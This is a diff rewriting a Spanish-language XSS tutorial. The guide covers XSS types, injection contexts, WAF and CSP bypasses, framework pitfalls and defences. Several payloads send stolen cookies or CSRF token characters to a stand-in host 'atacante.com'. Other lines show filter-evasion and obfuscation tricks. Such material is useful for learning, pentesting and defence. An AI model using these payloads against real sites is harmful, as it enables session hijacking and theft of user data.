@@ -1,290 +1,649 @@
-# ¿Qué es XSS (Cross-Site Scripting)?
+# XSS (Cross-Site Scripting) - Guía Completa
 
-El Cross-Site Scripting (XSS) es una vulnerabilidad de seguridad que permite a un atacante inyectar scripts maliciosos (comúnmente JavaScript) en páginas web vistas por otros usuarios. Estos scripts se ejecutan en el navegador de la víctima en el contexto del sitio web vulnerable.
+El Cross-Site Scripting (XSS) es una de las vulnerabilidades más críticas y prevalentes en aplicaciones web. Esta vulnerabilidad permite a un atacante inyectar scripts maliciosos que se ejecutan en el navegador de otros usuarios en el contexto del sitio vulnerable, comprometiendo la seguridad y privacidad de las víctimas.[^2]
 
-A diferencia de otros ataques que se dirigen al servidor, XSS se enfoca en los usuarios de la aplicación.
+## ¿Qué es XSS?
 
-**Impacto del XSS:**
+XSS es una vulnerabilidad que permite a un atacante inyectar scripts maliciosos (principalmente JavaScript) en páginas web vistas por otros usuarios. Estos scripts se ejecutan en el navegador de la víctima con los mismos privilegios que el sitio web legítimo, lo que puede tener consecuencias devastadoras.[^1]
 
-El XSS no es solo un `alert()`. El impacto puede ser severo, incluyendo:
+A diferencia de otros ataques dirigidos al servidor, XSS se enfoca específicamente en los usuarios de la aplicación, convirtiendo sus navegadores en herramientas de ataque.[^3]
 
-- **Robo de Sesión (Cookie Stealing):** Acceder a las cookies de sesión de la víctima para suplantar su identidad.
-- **Keylogging:** Capturar las pulsaciones de teclado de la víctima (credenciales, información personal).
-- **Phishing:** Modificar la página para mostrar formularios de login falsos y robar credenciales.
-- **Defacement:** Modificar la apariencia del sitio web.
-- **Redirección a Sitios Maliciosos:** Enviar a la víctima a sitios que descarguen malware o realicen otros ataques.
-- **Ejecución de Acciones en Nombre del Usuario:** Realizar acciones como si fuera el usuario (publicar, borrar, comprar).
-- **Bypass de CSRF:** Los scripts pueden generar peticiones con tokens CSRF si están disponibles en el DOM.
-- **Escaneo de Red Interna:** Usar el navegador de la víctima como proxy para escanear puertos de su red local.
+## Impacto Real del XSS
 
-### Ejemplo Básico de XSS Reflejado
+El XSS va mucho más allá de mostrar un simple `alert()`. Sus impactos pueden incluir:[^3]
 
-Consideremos un código HTML y PHP simple:
+**Robo de Sesión (Cookie Stealing):** Acceder a las cookies de sesión de la víctima para suplantar su identidad
+**Keylogging:** Capturar las pulsaciones de teclado de la víctima
+**Phishing:** Modificar la página para mostrar formularios de login falsos
+**Defacement:** Modificar la apariencia del sitio web
+**Redirección Maliciosa:** Enviar a la víctima a sitios que descarguen malware
+**Ejecución de Acciones no Autorizadas:** Realizar acciones como si fuera el usuario legítimo
+**Bypass de CSRF:** Los scripts pueden generar peticiones con tokens CSRF válidos
+**Escaneo de Red Interna:** Usar el navegador como proxy para escanear la red local[^1]
 
-**HTML Vulnerable (`index.html`):**
+## Tipos Principales de XSS
+
+### 1. XSS Reflejado (Reflected XSS)
+
+El XSS reflejado es la forma más común donde el payload malicioso se incluye en la petición HTTP y se "refleja" inmediatamente en la respuesta del servidor.[^3]
+
+**Características:**
+
+- El payload se envía típicamente en parámetros GET de la URL
+- Requiere interacción de la víctima (hacer clic en enlace malicioso)
+- No persistente - solo afecta a la sesión actual
+- También conocido como XSS no persistente o Tipo I[^5]
+
+**Ejemplo Práctico:**
+
+HTML vulnerable:
 
 ```html
 <html>
   <body>
     <form method="GET" action="saludo.php">
-      <p>What's your name?</p>
+      <p>¿Cuál es tu nombre?</p>
       <input name="name" type="text">
-      <button type="submit">Submit</button>
+      <button type="submit">Enviar</button>
     </form>
   </body>
 </html>
 ```
 
-**PHP Vulnerable (`saludo.php`):**
+PHP vulnerable:
 
 ```php
 <?php
   if (isset($_GET['name'])) {
-    // Vulnerabilidad: Se imprime el parámetro 'name' directamente sin sanitizar/codificar.
     echo "Hola, " . $_GET['name'] . "!";
   }
 ?>
 ```
 
 **Explotación:**
+URL maliciosa: `https://victima.com/saludo.php?name=<script>alert("XSS")</script>`
 
-Un atacante puede construir una URL como: `https://sitio-vulnerable.com/saludo.php?name=<script>alert("XSS POC")</script>`
-
-Cuando una víctima visita esta URL, el script se inyecta en la respuesta HTML y el navegador lo ejecuta: `Hola, <script>alert("XSS POC")</script>!`
-
-**Explotación con Impacto Real (Robo de Cookies):**
-
-Payload: `<script>var img = new Image(); img.src = "http://atacante.com/steal?cookie=" + document.cookie;</script>` URL maliciosa: `https://sitio-vulnerable.com/saludo.php?name=<script>var i=new Image();i.src="http://atacante.com/c=" %2B document.cookie;</script>` _(Nota: `%2B` es `+` codificado en URL)_
-
-Cuando la víctima visita la URL, su navegador ejecuta el script, que envía sus cookies (si no son `HttpOnly`) al servidor del atacante.
-
-### Tipos Principales de XSS
-
-1. **XSS Reflejado (Reflected XSS):**
-
-   - El payload malicioso se envía como parte de la petición HTTP (normalmente en un parámetro GET de la URL, pero también puede ser en POST).
-   - El servidor "refleja" el payload en la respuesta HTTP sin la sanitización o codificación adecuada.
-   - Requiere que la víctima haga clic en un enlace malicioso o envíe un formulario preparado por el atacante.
-   - **Superficies de ataque comunes:** Parámetros URL, datos de formularios POST.
-   - **Metodología de testeo:**
-     - Identificar todos los puntos de entrada de usuario (parámetros GET/POST, cabeceras HTTP reflejadas).
-     - Enviar texto de prueba (e.g., `TESTXSS`) y buscar dónde se refleja en la respuesta (usar "Ver código fuente" o las herramientas de desarrollador del navegador).
-     - Probar con etiquetas HTML inocuas para ver si se renderizan (e.g., `<u>test</u>`, `<b>test</b>`).
-     - Si se renderizan, intentar inyectar scripts.
-2. **XSS Almacenado (Stored XSS / Persistent XSS):**
-
-   - El payload malicioso se almacena permanentemente en el servidor de la aplicación (e.g., en una base de datos, archivo de log, foro de mensajes, comentarios, perfil de usuario).
-   - Cuando cualquier usuario visita la página que muestra estos datos almacenados, el script se ejecuta en su navegador.
-   - **Impacto mayor:** No requiere una acción específica de la víctima (como hacer clic en un enlace) más allá de visitar la página afectada. Puede afectar a todos los usuarios que vean el contenido malicioso, e incluso puede usarse para crear gusanos XSS (XSS worms).
-   - **Superficies de ataque comunes:** Campos de perfil de usuario, comentarios, posts en foros, nombres de archivo subidos, carritos de compra, logs visibles por administradores.
-3. **XSS Basado en DOM (DOM-based XSS):**
-
-   - La vulnerabilidad reside enteramente en el código JavaScript del lado del cliente.
-   - Ocurre cuando JavaScript toma datos de una fuente controlable por el atacante (e.g., `location.hash`, `location.search`, `document.referrer`, `window.name`, `localStorage`, `sessionStorage`, datos de `postMessage`) y los pasa a un "sink" (una función o propiedad del DOM que puede ejecutar scripts o modificar el HTML de forma insegura) sin la validación o codificación adecuadas.
-   - El payload puede no llegar nunca al servidor, lo que lo hace difícil de detectar por WAFs o logs del servidor.
-   - **Ejemplo:**
-
-     JavaScript
-
-```javascript
-  // Código vulnerable en la página
-  var searchTerm = location.hash.substring(1); // Fuente: location.hash
-  document.getElementById('searchResults').innerHTML = "Resultados para: " + searchTerm; // Sink: innerHTML
-```
-
-Payload del atacante: `https://sitio-vulnerable.com/busqueda#<img src=x onerror=alert(1)>`
-- **Fuentes comunes (Sources):** `document.URL`, `document.documentURI`, `location.href`, `location.search`, `location.hash`, `document.referrer`, `window.name`, `localStorage.getItem()`, `sessionStorage.getItem()`, datos recibidos vía `postMessage`.
-- **Sinks peligrosos (Sinks):** `element.innerHTML`, `element.outerHTML`, `document.write()`, `document.writeln()`, `eval()`, `setTimeout()`, `setInterval()`, `element.setAttribute('href', 'javascript:...')`, `script.src`, jQuery's `$(...).html()`, `$(...).append()`, `window.location.assign()`, `$.parseHTML()`.
-4. **Blind XSS:**
-
-- Es una variante de XSS Almacenado donde el atacante inyecta un payload, pero la reflexión (ejecución del script) ocurre en una parte diferente de la aplicación que el atacante no ve directamente (e.g., un panel de administración interno, un visor de logs, una aplicación móvil que consume datos de una API).
-- El atacante inyecta el payload "a ciegas" y espera una notificación (callback) cuando se ejecute.
-- **Herramientas (Servidores de Callback):**
-    - **Interactsh (de ProjectDiscovery):** Genera URLs únicas para usar en payloads. Cuando el payload se ejecuta, hace una petición a esta URL, notificando al atacante.
-    - **Burp Collaborator Client (Burp Suite Pro):** Similar a Interactsh.
-    - **XSS Hunter Express (auto-hosteable):** Alternativa a XSSHunter.com (ya no activo).
-- **Pasos:**
-    1. Generar un payload con un servidor de callback (e.g., `<script src="https://tu-dominio-interactsh.com"></script>`).
-    2. Inyectar el payload en todos los campos de entrada posibles, incluyendo cabeceras HTTP (User-Agent, Referer, X-Forwarded-For), formularios de contacto, feedback, etc.
-    3. Esperar la notificación (pingback) en el servidor de callback, que indicará la URL donde se ejecutó, IP de la víctima, cookies (si es posible), etc.
-### Contextos de Inyección y Técnicas de Escape
-
-El payload XSS debe adaptarse al contexto específico donde se inyecta el input del usuario.
-
-1. **Inyección Directa en HTML:**
-
-   - Entre etiquetas: `<div>AQUÍ_INPUT</div>` -> Payload: `<script>alert(1)</script>`
-   - `URL_param=javascript:alert(1)` (en `href` de `<a>` o `src` de `<iframe>`)
-   - `URL_param=<a href="javascript:alert(1)">Click</a>`
-   - `URL_param=<iframe src="javascript:alert(1)"></iframe>`
-   - `URL_param=<iframe srcdoc="<script>alert(1)</script>"></iframe>` (si `srcdoc` está permitido)
-2. **Inyección Dentro de Atributos HTML:**
-
-   - Input: `<input type="text" value="AQUÍ_INPUT">`
-     - Escape: `"><script>alert(1)</script>` (cierra el atributo y la etiqueta)
-     - Con Event Handler: `" onmouseover="alert(1);"` (cierra el valor, añade un event handler)
-     - Si las comillas están filtradas: `value=USUARIO onmouseover=alert(1)//` (el `//` comenta el resto)
-   - Input: `<a href="/ruta/AQUÍ_INPUT">`
-     - Escape: `javascript:alert(1)` (si el servidor lo permite en `href`)
-3. **Inyección Dentro de Etiquetas HTML Específicas (Escapando de ellas):**
-
-   - `</textarea><script>alert(1)</script>`
-   - `</title><script>alert(1)</script>`
-   - `</style><script>alert(1)</script>`
-   - `</script><script>alert(1)</script>` (si el input va dentro de otro script)
-   - `<script>alert(1)</script>` (escapando de comentarios HTML)
-4. **Inyección Dentro de JavaScript (JS Injection):**
-
-   - El input se refleja dentro de una etiqueta `<script> ... </script>`.
-   - Contexto: String literal.
-
-     JavaScript
-
-```javascript
- <script>
-  var username = 'AQUÍ_INPUT';
-document.getElementById('greeting').innerText = 'Hola, ' + username;
-  </script>
-```
-Payload: `';alert(document.domain);var ignore='` Resultado: `var username = '';alert(document.domain);var ignore='';` (el payload cierra el string, ejecuta código, y crea una nueva variable para que el resto del script original no cause error).
-- Contexto: Asignación numérica.
+**Payload de Robo de Cookies:**
 
 ```javascript
 <script>
-  var userId = AQUÍ_INPUT;
+var img = new Image(); 
+img.src = "http://atacante.com/steal?cookie=" + document.cookie;
 </script>
 ```
-Payload: `1; alert(1)`
-- Contexto: Dentro de una función o método.
+
+### 2. XSS Almacenado (Stored XSS)
+
+El XSS almacenado es considerado el más peligroso porque el payload se guarda permanentemente en el servidor.[^5]
+
+**Características:**
+
+- El script malicioso se almacena en base de datos, archivos o logs
+- Se ejecuta automáticamente cuando cualquier usuario visita la página afectada
+- No requiere interacción específica más allá de cargar la página
+- También conocido como XSS persistente o Tipo II[^5]
+- Puede crear gusanos XSS que se propagan automáticamente[^6]
+
+**Superficies de Ataque Comunes:**
+
+- Campos de perfil de usuario
+- Comentarios y posts en foros
+- Nombres de archivos subidos
+- Logs visibles por administradores
+- Formularios de contacto[^6]
+
+### 3. XSS Basado en DOM (DOM-based XSS)
+
+Esta variante ocurre enteramente en el lado del cliente, sin que el servidor procese el payload malicioso.[^8]
+
+**Características:**
+
+- La vulnerabilidad reside en el código JavaScript del cliente
+- El payload puede no llegar nunca al servidor
+- Difícil de detectar por WAFs o logs del servidor
+- Explota fuentes (sources) y sumideros (sinks) peligrosos[^8]
+
+**Ejemplo Vulnerable:**
 
 ```javascript
-   <script>
-   customFunction('AQUÍ_INPUT');      </script>
+// Fuente peligrosa
+var searchTerm = location.hash.substring(1); 
+// Sumidero peligroso
+document.getElementById('searchResults').innerHTML = "Resultados para: " + searchTerm;
 ```
-Payload: `');alert(1);customFunction('`
-5. **Inyección en CSS (menos común para ejecución de JS directa hoy en día):**
 
-- Escapar del contexto CSS a HTML: `input_controlado}</style><script>alert(1)</script>`
-- Funcionalidad `url()`: `body { background-image: url("javascript:alert(1)"); }` (obsoleto en navegadores modernos).
-- `expression()`: `div { width: expression(alert(1)); }` (solo IE, muy obsoleto).
-- **CSS Injection para robo de datos (avanzado):** Usar selectores de atributos para inferir caracteres y enviarlos a un servidor externo.
+**Payload de Ataque:**
+`https://victima.com/busqueda#<img src=x onerror=alert(1)>`
+
+**Fuentes Comunes (Sources):**
+
+- `document.URL`
+- `location.href`, `location.search`, `location.hash`
+- `document.referrer`
+- `window.name`
+- `localStorage.getItem()`, `sessionStorage.getItem()`
+
+**Sumideros Peligrosos (Sinks):**
+
+- `element.innerHTML`, `element.outerHTML`
+- `document.write()`, `document.writeln()`
+- `eval()`, `setTimeout()`, `setInterval()`
+- `element.setAttribute('href', 'javascript:...')`
+- jQuery's `$(...).html()`, `$(...).append()`[^7]
+
+### 4. Blind XSS
+
+Variante de XSS almacenado donde la ejecución ocurre en una parte de la aplicación que el atacante no ve directamente.[^5]
+
+**Características:**
+
+- El atacante inyecta payloads "a ciegas"
+- Requiere servidores de callback para detectar ejecución
+- Común en paneles de administración internos
+- Difícil de detectar manualmente
+
+**Herramientas:**
+
+- **Interactsh (ProjectDiscovery):** Genera URLs únicas para callbacks
+- **Burp Collaborator Client:** Similar funcionalidad
+- **XSS Hunter Express:** Alternativa auto-hospedable
+
+## Contextos de Inyección y Técnicas de Escape
+
+### Inyección Directa en HTML
+
+```html
+<!-- Contexto: Entre etiquetas -->
+<div>AQUÍ_INPUT</div>
+<!-- Payload: --><script>alert(1)</script>
+
+<!-- Contexto: En URLs -->
+<a href="AQUÍ_INPUT">Link</a>
+<!-- Payload: -->javascript:alert(1)
+```
+
+### Inyección en Atributos HTML
+
+```html
+<!-- Contexto: Valor de atributo -->
+<input type="text" value="AQUÍ_INPUT">
+<!-- Payload: -->"><script>alert(1)</script>
+<!-- O con event handler: -->" onmouseover="alert(1);"
+```
+
+### Inyección en JavaScript
+
+```javascript
+// Contexto: String literal
+var username = 'AQUÍ_INPUT';
+// Payload: ';alert(document.domain);var ignore='
+
+// Contexto: Numérico
+var userId = AQUÍ_INPUT;
+// Payload: 1; alert(1)
+```
+
+### Inyección en CSS
+
 ```css
-input[name="csrf_token"][value^="a"] { background-image: url("http://atacante.com/log?char=a"); }
-input[name="csrf_token"][value^="b"] { background-image: url("http://atacante.com/log?char=b"); }
-/* ... y así sucesivamente para cada caracter ... */
+/* Robo de datos con CSS */
+input[name="csrf_token"][value^="a"] { 
+  background-image: url("http://atacante.com/log?char=a"); 
+}
 ```
-### XSS en Diferentes Content-Types y Contextos Especiales
 
-- **Content-Type Incorrecto:**
-  - Si una API devuelve datos JSON (e.g., `{"mensaje":"Hola ben"}`) pero con la cabecera `Content-Type: text/html` en lugar de `application/json`, el navegador puede interpretar la respuesta como HTML.
-  - Si el contenido JSON es controlable por el atacante, podría inyectar HTML/JS.
-  - Mitigación del servidor: `X-Content-Type-Options: nosniff`.
-- **Markdown XSS:**
-  - Si un sitio permite Markdown y el parser/sanitizador no es seguro.
-  - `[un enlace](javascript:alert(1))`
-  - `![una imagen](x"onerror="alert(1))"` (se convierte en `<img src="x" onerror="alert(1)" alt="una imagen">`)
-- **SVG XSS:**
-  - Los archivos SVG son XML y pueden contener scripts. Si se permite subir SVGs y se muestran inline.
-  - `<svg xmlns="http://www.w3.org/2000/svg" onload="alert(document.domain)"/>`
-- **XSS en Atributos `style`:**
-  - `<div style="width: expression(alert(1))"></div>` (IE)
-  - `<div style="background:url(javascript:alert(1))"></div>` (navegadores antiguos)
+## Técnicas Avanzadas de Evasión
 
-### Técnicas de Evasión de Filtros (Bypasses)
+### Evasión de Filtros WAF
 
-Los filtros XSS (WAFs, sanitizadores del lado del servidor o cliente) intentan bloquear payloads conocidos. Los atacantes usan técnicas de evasión:
+**Case Insensitivity:**
 
-- **Case Insensitivity:** `<ScRiPt>alert(1)</sCrIpT>`
-- **Mezcla de Mayúsculas/Minúsculas en Event Handlers:** `<img src=x oNerroR=alert(1)>`
-- **Tags Incompletos o Rotos (Tag Breaking):** `<sc<script>ript>alert(1)</sc</script>ript>`
-- **Caracteres Nulos (Null Bytes):** `<img%00src=x onerror=alert(1)>` (si el backend los maneja mal).
-- **Codificación (Encoding):**
-  - URL Encoding: `%3Cscript%3Ealert(1)%3C/script%3E`
-  - HTML Entities (decimal/hex): `&lt;script&gt;alert(1)&lt;/script&gt;`, `&#x3C;script&#x3E;alert(1)&#x3C;/script&#x3E;`
-  - Doble Codificación: `&amp;lt;script&amp;gt;` -> `&lt;script&gt;` (si hay múltiples decodificaciones).
-- **Uso de Caracteres Alternativos o Comentarios:**
-  - Espacios/Tabs/Saltos de línea: `<img src = x onerror = alert(1)>`
-  - Barra `/` en lugar de espacio: `<img/src=x/onerror=alert(1)>`
-  - Comentarios HTML/XML: `<img src="x"onerror=alert(1)>`
-  - Comentarios JavaScript: `<img src=x onerror="/*EVIL*/alert(1)//">`
-- **Event Handlers Alternativos:** En lugar de `onerror`, usar `onmouseover`, `onclick`, `onfocus`, `onload`, `oncopy`, `oncut`, `onpaste`, etc.
-  - `<svg onload=alert(1)>`
-  - `<body onload=alert(1)>` (si puedes inyectar la etiqueta body)
-  - `<div onpointerover="alert(1)">Pasa el ratón</div>`
-- **Tags HTML Alternativos para Ejecutar JS:**
-  - `<img src=x onerror=alert(1)>`
-  - `<svg onload=alert(1)></svg>`
-  - `<iframe src="javascript:alert(1)"></iframe>`
-  - `<body onload=alert(1)>`
-  - `<video><source onerror="javascript:alert(1)">`
-  - `<audio src=x onerror=alert(1)>`
-  - `<details open ontoggle=alert(1)>`
-  - `<marquee onstart="alert(1)">`
-- **JavaScript Obfuscation:**
-  - `eval(atob('YWxlcnQoZG9jdW1lbnQuZG9tYWluKQ=='))` (payload `alert(document.domain)` codificado en Base64).
-  - `String.fromCharCode(97,108,101,114,116,40,49,41)` (para `alert(1)`).
-  - Uso de template literals: ``javascript:alert`1```
-- **Mutación XSS (mXSS):** El navegador "corrige" HTML malformado de una manera que crea una vulnerabilidad XSS que no era obvia en el HTML original. Ocurre por diferencias en cómo el parser del navegador y el sanitizador/WAF interpretan el HTML.
+```html
+<ScRiPt>alert(1)</sCrIpT>
+```
 
-### Content Security Policy (CSP) y sus Bypasses
+**Codificación:**
 
-**Content Security Policy (CSP)** es una cabecera HTTP (`Content-Security-Policy: ...`) que permite a los administradores de sitios web controlar los recursos que el navegador está autorizado a cargar para una página dada. Ayuda a prevenir y mitigar XSS.
+```html
+<!-- URL Encoding -->
+%3Cscript%3Ealert(1)%3C/script%3E
 
-**Ejemplo de Política CSP:** `default-src 'self'; script-src 'self' https://apis.google.com; object-src 'none'; style-src 'self' 'unsafe-inline'; img-src 'self' data:;`
+<!-- HTML Entities -->
+<script>alert(1)</script>
 
-**Directivas Comunes:**
+<!-- Hexadecimal -->
+<svg/onload=\u0066\u0065\u0074\u0063\u0068(`//atacante.com?cookie=`+document.cookie)>
+```
 
-- `default-src`: Política por defecto para la mayoría de las directivas.
-- `script-src`: Define fuentes válidas para JavaScript.
-- `style-src`: Define fuentes válidas para CSS.
-- `img-src`: Define fuentes válidas para imágenes.
-- `connect-src`: Define a qué orígenes se puede conectar (XHR, WebSockets, EventSource).
-- `frame-src`: Define orígenes válidos para iframes.
-- `object-src`: Define orígenes válidos para `<object>`, `<embed>`, `<applet>`. (Peligroso si permite `*` o `data:`).
-- `base-uri`: Restringe las URLs que pueden usarse en el elemento `<base>`.
-- `'self'`: Permite cargar recursos del mismo origen.
-- `'unsafe-inline'`: Permite JavaScript inline (event handlers, `<script>...</script>`) y CSS inline.
-- `'unsafe-eval'`: Permite `eval()` y funciones similares.
-- `nonce-{random}`: Permite scripts inline o estilos que tengan el atributo `nonce` con el valor aleatorio correcto.
-- `hash-{algo}-{base64}`: Permite scripts inline o estilos cuyo hash coincida.
+**Tags Alternativos:**
 
-**Técnicas Comunes de Bypass de CSP (si la política es laxa):**
+```html
+<img src=x onerror=alert(1)>
+<svg onload=alert(1)></svg>
+<iframe src="javascript:alert(1)"></iframe>
+<details open ontoggle=alert(1)>
+<marquee onstart="alert(1)">
+```
 
-1. **`'unsafe-inline'` en `script-src`:** Permite XSS tradicional inline.
-2. **`'unsafe-eval'` en `script-src`:** Permite el uso de `eval()`, `setTimeout("string")`, `JSON.parse()` sobre datos controlados, etc.
-3. **Wildcards (`*`) o Dominios Demasiado Permisivos en `script-src`:**
-   - Si `script-src *;` está presente, se puede cargar JS desde cualquier dominio.
-   - Si `script-src https://*.cdn-seguro.com;` y el CDN permite alojar contenido de usuario o tiene un subdominio vulnerable.
-   - Si `script-src https://algun-dominio-permitido.com;` y ese dominio tiene una vulnerabilidad de JSONP o contenido subido por usuarios que se pueda incluir como JS.
-     - **JSONP Endpoints:** `https://dominio-permitido.com/api/jsonp?callback=alert(document.domain)//` -> `<script src="https://dominio-permitido.com/api/jsonp?callback=alert(document.domain)//"></script>`
-4. **`data:` URI en `script-src`:**
-   - Si `script-src data:;`, se pueden usar payloads como: `<script src="data:text/javascript,alert(1)"></script>`
-5. **Subida de Archivos a Dominios Permitidos:**
-   - Si `script-src 'self';` o `script-src https://misitio.com;` y se puede subir un archivo `.js` (o un archivo con extensión de imagen pero contenido JS si el `Content-Type` es correcto o se puede manipular) al mismo dominio.
-   - Payload: `<script src="/uploads/payload.js"></script>`
-6. **Falta de `object-src` o `default-src` (o si son muy permisivos):**
-   - Se puede intentar inyectar `<object data="data:text/html,<script>alert(1)</script>">` o `<embed src="data:text/html,<script>alert(1)</script>">`.
-7. **Falta de `base-uri`:**
-   - Si no está definida o es laxa, se puede inyectar `<base href="https://atacante.com/">`. Las URLs relativas en la página (incluyendo scripts) ahora se cargarán desde el dominio del atacante (siempre que `script-src` lo permita).
-8. **Endpoints que Reflejan JS (AngularJS, etc.):**
-   - Algunas librerías JS (como versiones antiguas de AngularJS) pueden ejecutar JS desde el DOM en contextos específicos, incluso con CSPs restrictivas, si `unsafe-eval` no está presente pero se permite `self`.
-9. **Service Workers:**
-   - Si se puede registrar un Service Worker desde un dominio permitido en `script-src`, este puede interceptar peticiones y ejecutar código.
-10. **Errores de Configuración de Nonce/Hash:**
-    - Si el `nonce` es predecible, reutilizado o se filtra en la página.
-    - Si se puede inyectar un script existente en la página que tenga un hash permitido (raro).
+**Obfuscación JavaScript:**
 
-### Mitigaciones Generales contra XSS
+```javascript
+// Base64
+eval(atob('YWxlcnQoZG9jdW1lbnQuZG9tYWluKQ=='))
 
-- **Codificación de Salida Contextual (Contextual Output Encoding):** La principal defensa. Codificar los datos de forma diferente según el contexto donde se van a insertar:
-  - Codificación HTML para datos entre etiquetas HTML.
-  - Codificación de Atributos HTML para datos dentro de atributos.
-  - Codificación JavaScript Unicode para datos dentro de contextos JavaScript.
-  - Codificación CSS Hex para datos dentro de contextos CSS.
-  - Codificación URL para datos en parámetros URL.
-- **Validación de Entradas:** Rechazar entradas que no cumplan con el formato esperado. Es una defensa secundaria, no la principal.
-- **Sanitización de HTML:** Si se debe permitir HTML del usuario, usar una librería robusta y bien probada para sanitizarlo (eliminar elementos y atributos peligrosos).
-- **Content Security Policy (CSP):** Como se discutió, una capa de defensa crucial.
-- **Cabecera `HttpOnly` en Cookies:** Impide que JavaScript acceda a las cookies, mitigando el robo de sesión directo, pero no otros impactos de XSS.
-- **Cabecera `X-Content-Type-Options: nosniff`:** Evita que el navegador intente "adivinar" el `Content-Type` si el servidor lo envía incorrectamente.
-- **Uso de Frameworks Seguros:** Muchos frameworks modernos (React, Angular, Vue) tienen protecciones XSS incorporadas (auto-codificación) si se usan correctamente.
+// String.fromCharCode
+String.fromCharCode(97,108,101,114,116,40,49,41)
+
+// Template literals
+javascript:alert`1`
+```
+
+### Mutation XSS (mXSS)
+
+mXSS explota diferencias en cómo el parser del navegador y los sanitizadores interpretan HTML. El navegador "corrige" HTML malformado de manera que crea vulnerabilidades no obvias en el HTML original.[^11]
+
+**Ejemplo:**
+
+```html
+<!-- Input aparentemente seguro -->
+<INVALID TAG>
+{{constructor.constructor('alert(1)')()}}
+
+<!-- Se convierte en ejecutable después del parsing -->
+```
+
+Esta técnica es especialmente efectiva porque bypassa sanitizadores tradicionales que no anticipan las mutaciones del browser.[^10]
+
+## Content Security Policy (CSP) y Bypasses
+
+CSP es una cabecera HTTP crucial para mitigar XSS definiendo fuentes válidas para recursos.[^13]
+
+**Ejemplo de Política CSP:**
+
+```http
+Content-Security-Policy: default-src 'self'; script-src 'self' https://apis.google.com; object-src 'none';
+```
+
+### Técnicas Comunes de Bypass
+
+**1. Explotación de Endpoints JSONP:**
+
+```html
+<script src="https://accounts.google.com/o/oauth2/revoke?callback=alert(1)"></script>
+```
+
+**2. Subida de Archivos:**
+Si `script-src 'self'` permite subir archivos JS:
+
+```html
+<script src="/uploads/payload.js"></script>
+```
+
+**3. Base URI Injection:**
+
+```html
+<base href="https://atacante.com/">
+<!-- Ahora todos los scripts relativos se cargan desde el dominio del atacante -->
+```
+
+**4. Data URIs:**
+Si `script-src data:` está permitido:
+
+```html
+<script src="data:text/javascript,alert(1)"></script>
+```
+
+## XSS en Frameworks Modernos
+
+### React
+
+React proporciona protección automática contra XSS através de JSX:[^15]
+
+**Protecciones:**
+
+- Escape automático de valores en JSX
+- `dangerouslySetInnerHTML` como advertencia explícita
+- React DOM escapa valores antes del renderizado
+
+**Vulnerabilidades potenciales:**
+
+```javascript
+// Peligroso - usar con precaución
+<div dangerouslySetInnerHTML={{__html: userInput}} />
+```
+
+### Angular
+
+Angular tiene protecciones robustas contra XSS:[^15]
+
+**Protecciones:**
+
+- Escape contextual automático
+- DomSanitizer para contenido confiable
+- Compatibilidad con CSP
+- Sanitización automática de HTML, estilos y URLs
+
+**Bypasses potenciales:**
+
+```typescript
+// Peligroso - bypassa la sanitización
+this.sanitizer.bypassSecurityTrustHtml(userInput)
+```
+
+### Vue.js
+
+Vue.js también implementa protecciones sólidas:[^15]
+
+**Protecciones:**
+
+- Escape automático en templates
+- Directiva `v-html` para HTML crudo (usar con precaución)
+- Plugin vue-sanitize para sanitización adicional
+
+## Inyección de Templates del Cliente (CSTI)
+
+CSTI es una técnica que explota frameworks de templates del lado del cliente:[^18][^19]
+
+**AngularJS (versiones antiguas):**
+
+```javascript
+{{constructor.constructor('alert(1)')()}}
+```
+
+**Vue.js:**
+
+```javascript
+{{_createElementBlock.constructor("alert(1)")()}}
+```
+
+Esta técnica puede bypassar medidas de seguridad tradicionales porque el código malicioso se ejecuta después de la sanitización HTML.[^17]
+
+## Técnicas de Detección y Testing
+
+### Detección Manual
+
+**1. Identificar puntos de entrada:**
+
+- Parámetros GET/POST
+- Campos de formulario
+- Headers HTTP reflejados
+
+**2. Testing básico:**
+
+```html
+<!-- String de prueba -->
+TESTXSS
+
+<!-- Tags HTML inocuas -->
+<u>test</u>
+<b>test</b>
+
+<!-- Payloads básicos -->
+<script>alert(1)</script>
+<img src=x onerror=alert(1)>
+```
+
+### Herramientas Automatizadas
+
+**DOM Invader (Burp Suite):**
+
+- Identifica sources y sinks automáticamente
+- Inyecta strings de prueba en todas las fuentes posibles
+- Proporciona stack traces para debugging[^9]
+
+**Análisis Estático:**
+
+- ESLint con plugins de seguridad para detectar patrones peligrosos
+- Revisión de código para identificar uso inseguro de APIs[^9]
+
+## Estrategias de Prevención
+
+### 1. Codificación de Salida Contextual
+
+La defensa principal contra XSS es la codificación apropiada según el contexto:[^3]
+
+**HTML Context:**
+
+```html
+<!-- Codificar < > & " ' -->
+<script> → <script>
+```
+
+**JavaScript Context:**
+
+```javascript
+// Unicode escaping
+\u003cscript\u003e
+```
+
+**URL Context:**
+
+```
+%3Cscript%3E
+```
+
+### 2. Validación de Entrada
+
+**Whitelist approach:**
+
+```php
+// Solo permitir caracteres alfanuméricos
+if (preg_match('/^[a-zA-Z0-9]+$/', $input)) {
+    // Processar input
+}
+```
+
+### 3. Sanitización HTML
+
+Para contenido HTML legítimo, usar librerías probadas:
+
+- **DOMPurify** (JavaScript)
+- **HTMLPurifier** (PHP)
+- **Bleach** (Python)
+
+### 4. Content Security Policy
+
+Implementar CSP estricta:[^12]
+
+```http
+Content-Security-Policy: 
+  default-src 'self'; 
+  script-src 'self' 'nonce-randomvalue123'; 
+  style-src 'self' 'unsafe-inline'; 
+  img-src 'self' data:;
+```
+
+### 5. Headers de Seguridad Adicionales
+
+```http
+X-Content-Type-Options: nosniff
+X-Frame-Options: DENY
+X-XSS-Protection: 1; mode=block
+```
+
+### 6. Cookies Seguras
+
+```http
+Set-Cookie: sessionid=abc123; HttpOnly; Secure; SameSite=Strict
+```
+
+### 7. Frameworks Seguros
+
+Usar frameworks modernos que implementen protecciones por defecto:[^15]
+
+- React con JSX
+- Angular con sanitización automática
+- Vue.js con escape de templates
+
+## Mejores Prácticas para Desarrolladores
+
+### Principios Fundamentales
+
+1. **Asumir que toda entrada es maliciosa** - Nunca confiar en datos del usuario
+2. **Codificación contextual** - Codificar datos según donde se usen
+3. **Principio de menor privilegio** - Limitar permisos y accesos
+4. **Defensa en profundidad** - Implementar múltiples capas de seguridad
+
+### Testing y Auditoría
+
+1. **Pentesting regular** - Pruebas de penetración periódicas
+2. **Code review** - Revisión de código enfocada en seguridad
+3. **Automated scanning** - Herramientas de análisis estático y dinámico
+4. **Bug bounty programs** - Programas de recompensas por vulnerabilidades
+
+### Consideraciones Especiales para Bug Bounty
+
+Cuando busques XSS en aplicaciones modernas:
+
+1. **Enfócate en funcionalidades complejas** - Editores WYSIWYG, file uploads, etc.
